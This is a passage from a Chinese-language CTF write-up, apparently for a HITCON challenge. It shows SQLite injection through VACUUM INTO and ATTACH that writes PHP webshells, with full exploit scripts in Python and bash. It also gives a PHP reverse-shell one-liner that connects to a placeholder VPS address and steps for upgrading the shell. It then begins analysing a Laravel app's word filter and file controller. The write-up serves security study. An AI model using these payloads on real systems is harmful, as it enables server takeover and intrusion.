class="string">&quot;&quot;&quot;&lt;?=`wc|/r*`;&#x27;);VACUUM INTO(&#x27;x&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do this a few times until flag</span></span><br><span class="line">res = requests.get(<span class="string">f&quot;<span class="subst">&#123;HOST&#125;</span>sandbox/<span class="subst">&#123;SANDBOX_HASH&#125;</span>/z.php&quot;</span>)</span><br><span class="line">res.raise_for_status()</span><br><span class="line"><span class="built_in">print</span>(res.content)</span><br></pre></td></tr></table></figure>

<p>第一步<br><code>execute_msg(&quot;&quot;&quot;&lt;?=`*`;&#39;);VACUUM INTO(&#39;z.php&quot;&quot;&quot;)</code><br>注入后的 SQL 变成：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> msg (content TEXT);</span><br><span class="line"><span class="keyword">INSERT INTO</span> msg <span class="keyword">VALUES</span>(<span class="string">&#x27;&lt;?=`*`;&#x27;</span>);           <span class="comment">-- 先把一段 PHP 代码塞进数据库页</span></span><br><span class="line">VACUUM <span class="keyword">INTO</span>(<span class="string">&#x27;z.php&#x27;</span>);                          <span class="comment">-- 再把整个数据库拷贝到 z.php</span></span><br></pre></td></tr></table></figure>

<p>第二步<br><code>execute_msg(&quot;&quot;&quot;&#39;);VACUUM INTO(&#39;php&quot;&quot;&quot;)</code><br>注入后的 SQL 变成：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> msg (content TEXT);</span><br><span class="line"><span class="keyword">INSERT INTO</span> msg <span class="keyword">VALUES</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">VACUUM <span class="keyword">INTO</span>(<span class="string">&#x27;php&#x27;</span>);                            <span class="comment">-- 在同目录生成一个名为 &quot;php&quot; 的文件</span></span><br></pre></td></tr></table></figure>

<p>第三步<br><code>execute_msg(&quot;&quot;&quot;&lt;?=`wc|/r*`;&#39;);VACUUM INTO(&#39;x&quot;&quot;&quot;)</code><br>注入后的 SQL 变成：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> msg (content TEXT);</span><br><span class="line"><span class="keyword">INSERT INTO</span> msg <span class="keyword">VALUES</span>(<span class="string">&#x27;&lt;?=`wc|/r*`;&#x27;</span>);</span><br><span class="line">VACUUM <span class="keyword">INTO</span>(<span class="string">&#x27;x&#x27;</span>);                              <span class="comment">-- 写到文件 &quot;x&quot;</span></span><br></pre></td></tr></table></figure>

<p>之后我们访问 z.php 时，里面的<code>&lt;?=`*`;</code>会启动一个 shell， 在当前目录展开所有文件名，此时应为php x z.php</p>
<p>在类 Unix shell 中，这会把第一个单词当作命令，于是等价于执行：php x z.php，其实也就是把x当作一个php文件去执行了，因此x中的<code>&lt;?=`wc|/r*`;</code>就被成功执行</p>
<p>这个点还真是第一次见，在vps上实验了一下，发现还真是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8ze93nwj9zenhhgk508Z:/var/www/html# ls</span><br><span class="line">frpc  frpc1.toml  frps  fscan  index.php  powercat.ps1  test.dtd  z.php</span><br><span class="line">root@iZf8ze93nwj9zenhhgk508Z:/var/www/html# php z.php</span><br><span class="line">sh: 1: frpc: not found</span><br></pre></td></tr></table></figure>

<p>不过由于执行完&#x2F;read_flag还需要交互，所以还是得写个马上去，然后反弹shell才行</p>
<p>exp2.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">with</span> urlopen(url) <span class="keyword">as</span> r:</span><br><span class="line">        r.read()  <span class="comment"># we don&#x27;t need the body; just trigger the request</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_msg</span>(<span class="params">base, payload</span>):</span><br><span class="line">    <span class="comment"># URL-encode only the msg value</span></span><br><span class="line">    q = quote(payload, safe=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;base&#125;</span>/?msg=<span class="subst">&#123;q&#125;</span>&quot;</span></span><br><span class="line">    get(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] GET <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">base, path</span>):</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;base&#125;</span><span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">    get(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] GET <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    base = <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1) Initial three requests (remove &lt;@urlencode&gt; tag; encode the inside)</span></span><br><span class="line">    send_msg(base, <span class="string">&quot;&lt;?=`*`;&#x27;);VACUUM INTO&#x27;..php&#x27;;&quot;</span>)</span><br><span class="line">    send_msg(base, <span class="string">&quot;&lt;?=`$_GET[0]&#x27;);VACUUM INTO(&#x27;.y&quot;</span>)</span><br><span class="line">    send_msg(base, <span class="string">&quot;`;&#x27;);VACUUM INTO(&#x27;.z&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2) ATTACH template over given paths (p -&gt; &#123;ibs=1, if=.y, obs=1, of=.w.php, skip=8180&#125;)</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> [<span class="string">&quot;dd&quot;</span>, <span class="string">&quot;ibs=1&quot;</span>, <span class="string">&quot;if=.y&quot;</span>, <span class="string">&quot;obs=1&quot;</span>, <span class="string">&quot;of=.w.php&quot;</span>, <span class="string">&quot;skip=8180&quot;</span>]:</span><br><span class="line">        send_msg(base, <span class="string">f&quot;&#x27;);ATTACH&#x27;<span class="subst">&#123;p&#125;</span>&#x27;AS h;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3) Fetch the created ..php (path provided in your instructions)</span></span><br><span class="line">    fetch(base, <span class="string">&quot;/sandbox/a66bee76fe7c8662107934bd6464d03c/..php&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4) More ATTACH paths: skip=8190, if=.z</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> [<span class="string">&quot;skip=8190&quot;</span>, <span class="string">&quot;if=.z&quot;</span>, <span class="string">&quot;seek=12&quot;</span>]:</span><br><span class="line">        send_msg(base, <span class="string">f&quot;&#x27;);ATTACH&#x27;<span class="subst">&#123;p&#125;</span>&#x27;AS h;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5) Fetch ..php again</span></span><br><span class="line">    fetch(base, <span class="string">&quot;/sandbox/a66bee76fe7c8662107934bd6464d03c/..php&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>至此.w.php已经被写入一句话木马，按下面流程反弹shell即可</p>
<ol>
<li>浏览器访问<code>http://localhost:8080/sandbox/a66bee76fe7c8662107934bd6464d03c/.w.php?0=echo &quot;&lt;?php \$ip=&#39;xxx.xxx.xxx.xxx&#39;;\$port=xxxx;\$sock=fsockopen(\$ip,\$port);\$proc=proc_open(&#39;/bin/sh&#39;,array(0=&gt;\$sock,1=&gt;\$sock,2=&gt;\$sock),\$pipes);?&gt;&quot; &gt; 1.php</code></li>
<li>vps起监听</li>
<li>浏览器访问<code>http://localhost:8080/sandbox/a66bee76fe7c8662107934bd6464d03c/.w.php?0=php 1.php</code></li>
<li>此时vps应该已经接收到反弹过来的shell，需要通过<code>script -qc /bin/bash /dev/null</code>升级为交互式shell</li>
<li>执行.&#x2F;read_flag，完成交互即可</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@6a6da2e2495c:/$ ./read_flag</span><br><span class="line">./read_flag</span><br><span class="line">76 x 69 = ? 5244</span><br><span class="line">5244</span><br><span class="line">hitcon&#123;123&#125;</span><br></pre></td></tr></table></figure>

<p>还有一位师傅的payload，原理也一样</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/?msg=<span class="subst">$(urlencode <span class="string">&quot;&#x27;);VACUUM INTO(&#x27;cp&quot;</span>)</span>&quot;</span></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/?msg=<span class="subst">$(urlencode &#x27;&lt;?=`ls&gt;_`;&#x27;<span class="string">&quot;&#x27;);VACUUM INTO(&#x27;z&quot;</span>)</span>&quot;</span></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/?msg=<span class="subst">$(urlencode &#x27;&lt;?=`*`;&#x27;<span class="string">&quot;&#x27;);VACUUM INTO(&#x27;z.php&quot;</span>)</span>&quot;</span></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/sandbox/<span class="variable">$2</span>/z.php&quot;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/?msg=<span class="subst">$(urlencode &#x27;&lt;?=`sh _`;&#x27;<span class="string">&quot;&#x27;);VACUUM INTO(&#x27;cz&quot;</span>)</span>&quot;</span></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/?msg=<span class="subst">$(urlencode &#x27;&lt;?=`c*`;&#x27;<span class="string">&quot;&#x27;);VACUUM INTO(&#x27;cz.php&quot;</span>)</span>&quot;</span></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/sandbox/<span class="variable">$2</span>/cz.php&quot;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/?msg=<span class="subst">$(urlencode <span class="string">&quot;&#x27;);VACUUM INTO(&#x27;mv&quot;</span>)</span>&quot;</span></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/?msg=<span class="subst">$(urlencode &#x27;&lt;?=`sh x`;&#x27;<span class="string">&quot;&#x27;);VACUUM INTO(&#x27;mz&quot;</span>)</span>&quot;</span></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/?msg=<span class="subst">$(urlencode &#x27;&lt;?=`m*`;&#x27;<span class="string">&quot;&#x27;);VACUUM INTO(&#x27;mz.php&quot;</span>)</span>&quot;</span></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/sandbox/<span class="variable">$2</span>/mz.php&quot;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/?msg=<span class="subst">$(urlencode <span class="string">&quot;&#x27;);VACUUM INTO(&#x27;ls -t&gt;x&quot;</span>)</span>&quot;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/sandbox/<span class="variable">$2</span>/z.php&quot;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/?msg=<span class="subst">$(urlencode <span class="string">&quot;&#x27;);VACUUM INTO(&#x27;&gt;a.php&quot;</span>)</span>&quot;</span></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/?msg=<span class="subst">$(urlencode <span class="string">&quot;&#x27;);VACUUM INTO(&#x27;\`\$_GET[0]\`;&#x27;&#x27;\\&quot;</span>)</span>&quot;</span></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/?msg=<span class="subst">$(urlencode <span class="string">&quot;&#x27;);VACUUM INTO(&#x27;echo &#x27;&#x27;&lt;?=&quot;</span>)</span>&quot;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/sandbox/<span class="variable">$2</span>/cz.php&quot;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&quot;<span class="variable">$1</span>/sandbox/<span class="variable">$2</span>/mz.php&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>一个laravel框架的站，源码很多，不过真正需要关注的只有几个php文件</p>
<p>api.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">AuthController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Middleware</span>\<span class="title">DangerousWordFilter</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">FileController</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/register&#x27;</span>, [<span class="title class_">AuthController</span>::<span class="variable language_">class</span>, <span class="string">&#x27;register&#x27;</span>])-&gt;<span class="title function_ invoke__">middleware</span>(<span class="title class_">DangerousWordFilter</span>::<span class="variable language_">class</span>);</span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/login&#x27;</span>,    [<span class="title class_">AuthController</span>::<span class="variable language_">class</span>, <span class="string">&#x27;login&#x27;</span>])-&gt;<span class="title function_ invoke__">middleware</span>(<span class="title class_">DangerousWordFilter</span>::<span class="variable language_">class</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// New public route for serving admin files</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/announcement/&#123;filename&#125;&#x27;</span>, [<span class="title class_">FileController</span>::<span class="variable language_">class</span>, <span class="string">&#x27;servePublicAdminFile&#x27;</span>])-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;.*&#x27;</span>);</span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/announcements&#x27;</span>, [<span class="title class_">FileController</span>::<span class="variable language_">class</span>, <span class="string">&#x27;serveAllPublicAdminFile&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">middleware</span>(<span class="string">&#x27;auth:sanctum&#x27;</span>)-&gt;<span class="title function_ invoke__">group</span>(function () &#123;</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/logout&#x27;</span>, [<span class="title class_">AuthController</span>::<span class="variable language_">class</span>, <span class="string">&#x27;logout&#x27;</span>])-&gt;<span class="title function_ invoke__">middleware</span>(<span class="title class_">DangerousWordFilter</span>::<span class="variable language_">class</span>);</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/user&#x27;</span>, function (Request <span class="variable">$request</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">user</span>();</span><br><span class="line">    &#125;)-&gt;<span class="title function_ invoke__">middleware</span>(<span class="title class_">DangerousWordFilter</span>::<span class="variable language_">class</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File Upload and Download Routes</span></span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/upload&#x27;</span>, [<span class="title class_">FileController</span>::<span class="variable language_">class</span>, <span class="string">&#x27;upload&#x27;</span>])-&gt;<span class="title function_ invoke__">middleware</span>(<span class="title class_">DangerousWordFilter</span>::<span class="variable language_">class</span>);</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/download/&#123;filename&#125;&#x27;</span>, [<span class="title class_">FileController</span>::<span class="variable language_">class</span>, <span class="string">&#x27;download&#x27;</span>])-&gt;<span class="title function_ invoke__">middleware</span>(<span class="title class_">DangerousWordFilter</span>::<span class="variable language_">class</span>);</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/files&#x27;</span>, [<span class="title class_">FileController</span>::<span class="variable language_">class</span>, <span class="string">&#x27;getAllFiles&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Admin command execution</span></span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/admin/testFile&#x27;</span>, [<span class="title class_">\App\Http\Controllers\AdminController</span>::<span class="variable language_">class</span>, <span class="string">&#x27;testFile&#x27;</span>]);</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/admin/report&#x27;</span>, [<span class="title class_">\App\Http\Controllers\AdminController</span>::<span class="variable language_">class</span>, <span class="string">&#x27;report&#x27;</span>])-&gt;<span class="title function_ invoke__">middleware</span>(<span class="title class_">DangerousWordFilter</span>::<span class="variable language_">class</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>可以看到&#x2F;register等路由经过了一个DangerousWordFilter的middleware，下面看看这个middleware做了些什么<br>DangerousWordFilter.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Middleware</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Closure</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Response</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DangerousWordFilter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle an incoming request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">Request <span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>): <span class="title">Response</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">path</span>()===<span class="string">&quot;api/login&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$dangerousWords</span> = [<span class="string">&#x27;badword1&#x27;</span>, <span class="string">&#x27;badword2&#x27;</span>, <span class="string">&#x27;badword3&#x27;</span>, <span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>]; <span class="comment">// Added &#x27;..&#x27;</span></span><br><span class="line">        <span class="variable">$rawBody</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getContent</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$rawBody</span>)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$dangerousWords</span> <span class="keyword">as</span> <span class="variable">$word</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$rawBody</span>, <span class="variable">$word</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Request contains dangerous words.&#x27;</span>], <span class="number">403</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里对登录接口 api&#x2F;login 不做检测，直接放行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">path</span>()===<span class="string">&quot;api/login&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就是检查请求体里面是否有如下危险字符串<code>$dangerousWords = [&#39;badword1&#39;, &#39;badword2&#39;, &#39;badword3&#39;, &#39;..&#39;, &#39;admin&#39;];</code></p>
<p>继续分析<br>FileController.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Storage</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Auth</span>; <span class="comment">// To get the authenticated user</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">validate</span>([</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span> =&gt; <span class="string">&#x27;required|file|max:5&#x27;</span>, // Max <span class="number">10</span>MB file size</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$user</span> = <span class="title class_">Auth</span>::<span class="title function_ invoke__">user</span>();</span><br><span class="line">        <span class="keyword">if</span> (!<span 